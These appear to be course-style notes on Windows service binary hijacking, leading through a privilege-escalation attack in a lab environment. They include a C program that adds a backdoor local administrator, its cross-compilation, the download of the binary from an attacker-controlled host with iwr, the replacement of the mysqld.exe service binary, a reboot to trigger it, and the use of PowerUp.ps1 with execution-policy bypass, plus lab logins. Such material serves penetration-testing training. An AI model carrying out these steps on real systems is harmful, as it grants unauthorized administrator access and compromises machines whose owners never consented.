# Service Binary Hijacking

List of services with binary path
>``` shell
>PS C:\Users\dave> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
>
># ========== Expected Result ==========
>Name                      State   PathName
>----                      -----   --------
>Apache2.4                 Running "C:\xampp\apache\bin\httpd.exe" -k runservice
>Appinfo                   Running C:\Windows\system32\svchost.exe -k netsvcs -p
>AppXSvc                   Running C:\Windows\system32\svchost.exe -k wsappx -p
>AudioEndpointBuilder      Running C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p
>Audiosrv                  Running C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p
>BFE                       Running C:\Windows\system32\svchost.exe -k LocalServiceNoNetworkFirewall -p
>BITS                      Running C:\Windows\System32\svchost.exe -k netsvcs -p
>BrokerInfrastructure      Running C:\Windows\system32\svchost.exe -k DcomLaunch -p
>...
>mysql                     Running C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql
>...
># =====================================
>```

icacls permissions mask
>``` shell
>Mask |	Permissions
>F    |	Full access
>M    |	Modify access
>RX   | Read and execute access
>R    |	Read-only access
>W    |	Write-only access
>```

Permissions of httpd.exe
>``` shell
>PS C:\Users\dave> icacls "C:\xampp\apache\bin\httpd.exe"
>
># ========== Expected Result ==========
>C:\xampp\apache\bin\httpd.exe BUILTIN\Administrators:(F)
>                              NT AUTHORITY\SYSTEM:(F)
>                              BUILTIN\Users:(RX)
>                              NT AUTHORITY\Authenticated Users:(RX)
>
>Successfully processed 1 files; Failed processing 0 files
># =====================================
>```

Permissions of mysqld.exe
>``` shell
>PS C:\Users\dave> icacls "C:\xampp\mysql\bin\mysqld.exe"
>
># ========== Expected Result ==========
>C:\xampp\mysql\bin\mysqld.exe NT AUTHORITY\SYSTEM:(F)
>                              BUILTIN\Administrators:(F)
>                              BUILTIN\Users:(F)
>
>Successfully processed 1 files; Failed processing 0 files
># =====================================
>```

adduser.c code
>``` shell
>#include <stdlib.h>
>
>int main ()
>{
>  int i;
>  
>  i = system ("net user dave2 password123! /add");
>  i = system ("net localgroup administrators dave2 /add");
>  
>  return 0;
>}
>```

Cross-Compile the C Code to a 64-bit application
>``` shell
>kali@kali:~$ x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
>```

Replacing mysqld.exe with our malicious binary
>``` shell
>PS C:\Users\dave> iwr -uri http://192.168.48.3/adduser.exe -Outfile adduser.exe  
>
>PS C:\Users\dave> move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
>
>PS C:\Users\dave> move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
>```

Attempting to stop the service to restart it
>``` shell
>PS C:\Users\dave> net stop mysql
>
># ========== Expected Result ==========
>System error 5 has occurred.
>
>Access is denied.
># =====================================
>```

Obtain Startup Type for mysql service
>``` shell
>PS C:\Users\dave> Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
>
># ========== Expected Result ==========
>Name  StartMode
>----  ---------
>mysql Auto
># =====================================
>```

Checking for reboot privileges
>``` shell
>PS C:\Users\dave> whoami /priv
>
># ========== Expected Result ==========
>PRIVILEGES INFORMATION
>----------------------
>
>Privilege Name                Description                          State
>============================= ==================================== ========
>SeSecurityPrivilege           Manage auditing and security log     Disabled
>SeShutdownPrivilege           Shut down the system                 Disabled
>SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
>SeUndockPrivilege             Remove computer from docking station Disabled
>SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
>SeTimeZonePrivilege           Change the time zone                 Disabled
># =====================================
>```

Rebooting the machine
>``` shell
>PS C:\Users\dave> shutdown /r /t 0 
>```

Display members of the local administrators group
>``` shell
>PS C:\Users\dave> Get-LocalGroupMember administrators
>
># ========== Expected Result ==========
>ObjectClass Name                      PrincipalSource
>----------- ----                      ---------------
>User        CLIENTWK220\Administrator Local
>User        CLIENTWK220\BackupAdmin   Local
>User        CLIENTWK220\dave2         Local
>User        CLIENTWK220\daveadmin     Local
>User        CLIENTWK220\offsec        Local
># =====================================
>```

Copy PowerUp.ps1 to kali's home directory and serve it with a Python3 web server
>``` shell
>kali@kali:~$ cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
>
>kali@kali:~$ python3 -m http.server 80
>
># ========== Expected Result ==========
>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ..
># =====================================
>```

Import PowerUp.ps1 and execute Get-ModifiableServiceFile
>``` shell
>PS C:\Users\dave> iwr -uri http://192.168.48.3/PowerUp.ps1 -Outfile PowerUp.ps1
>
>PS C:\Users\dave> powershell -ep bypass
>
>PS C:\Users\dave>  . .\PowerUp.ps1
>
>PS C:\Users\dave> Get-ModifiableServiceFile
>
># ========== Expected Result ==========
>...
>ServiceName                     : mysql
>Path                            : C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql
>ModifiableFile                  : C:\xampp\mysql\bin\mysqld.exe
>ModifiableFilePermissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
>ModifiableFileIdentityReference : BUILTIN\Users
>StartName                       : LocalSystem
>AbuseFunction                   : Install-ServiceBinary -Name 'mysql'
>CanRestart                      : False
># =====================================
>```

Error from AbuseFunction
>``` shell
>PS C:\Users\dave> Install-ServiceBinary -Name 'mysql'
>
># ========== Expected Result ==========
>Service binary 'C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql' for service mysql not
>modifiable by the current user.
>At C:\Users\dave\PowerUp.ps1:2178 char:13
>+             throw "Service binary '$($ServiceDetails.PathName)' for s ...
>+             ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
>    + CategoryInfo          : OperationStopped: (Service binary ...e current user.:String) [], RuntimeException
>    + FullyQualifiedErrorId : Service binary 'C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini
>   mysql' for service mysql not modifiable by the current user.
># =====================================
>```

Analyzing the function ModifiablePath
>``` shell
>PS C:\Users\dave> $ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe' | Get-ModifiablePath -Literal
>
>PS C:\Users\dave> $ModifiableFiles
>
># ========== Expected Result ==========
>ModifiablePath                IdentityReference Permissions
>--------------                ----------------- -----------
>C:\xampp\mysql\bin\mysqld.exe BUILTIN\Users     {WriteOwner, Delete, WriteAttributes, Synchronize...}
># =====================================
>
>PS C:\Users\dave> $ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe argument' | Get-ModifiablePath -Literal
>
>PS C:\Users\dave> $ModifiableFiles
>
># ========== Expected Result ==========
>ModifiablePath     IdentityReference                Permissions
>--------------     -----------------                -----------
>C:\xampp\mysql\bin NT AUTHORITY\Authenticated Users {Delete, WriteAttributes, Synchronize, ReadControl...}
>C:\xampp\mysql\bin NT AUTHORITY\Authenticated Users {Delete, GenericWrite, GenericExecute, GenericRead}
># =====================================
>
>PS C:\Users\dave> $ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe argument -conf=C:\test\path' | Get-ModifiablePath -Literal 
>
>PS C:\Users\dave> $ModifiableFiles
>```

Lab 1 - Log in with the credentials dave:lab and follow the steps outlined in this section on CLIENTWK220 (VM #1) to replace the service binary of the service mysql. Enter the flag, which can be found on the desktop of user daveadmin.
>``` shell
>
>```
>

Lab 2 - Connect to CLIENTWK221 (VM #2) via RDP as user milena with the password MyBirthDayIsInJuly1!. Find a service in which milena can replace the service binary. Get an interactive shell as user running the service and find the flag on the desktop.
>``` shell
>
>```
>
